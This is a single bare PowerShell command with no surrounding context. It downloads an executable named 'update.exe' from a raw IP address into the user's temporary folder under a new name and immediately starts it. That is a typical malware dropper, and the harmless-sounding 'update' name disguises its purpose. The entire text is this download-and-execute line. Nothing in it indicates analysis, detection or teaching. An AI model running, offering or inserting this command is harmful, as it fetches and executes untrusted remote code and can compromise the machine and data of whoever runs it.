
(New-Object System.Net.WebClient).DownloadFile('http://185.117.75.43/update.exe',"$env:TEMP\update1x86.exe");Start-Process ("$env:TEMP\update1x86.exe")

